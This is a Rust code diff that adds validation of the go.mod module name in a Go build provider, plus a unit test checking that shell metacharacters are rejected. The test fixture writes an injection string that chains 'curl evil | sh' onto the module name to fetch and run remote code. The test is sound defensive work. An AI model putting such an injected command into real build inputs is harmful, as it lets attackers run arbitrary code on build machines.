@@ -32,6 +32,7 @@ impl Provider for GoProvider {
 
     fn plan(&self, ctx: &AppContext) -> Result<BuildPlan> {
         let binary = Self::binary_name(ctx);
+        crate::sanitize::validate_token("go.mod module name", &binary)?;
 
         // Single build stage. A separate deps stage cannot work here: kiln's
         // Stage does all COPYs before all RUNs, so it can't do the `COPY go.mod;
@@ -81,6 +82,17 @@ impl Provider for GoProvider {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn rejects_injection_in_go_module() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("go.mod"), "module app && curl evil | sh\n").unwrap();
+        let ctx = AppContext::new(dir.path()).unwrap();
+        assert!(
+            GoProvider.plan(&ctx).is_err(),
+            "shell metachars in go module must be rejected"
+        );
+    }
 
     #[test]
     fn detects_go_project() {
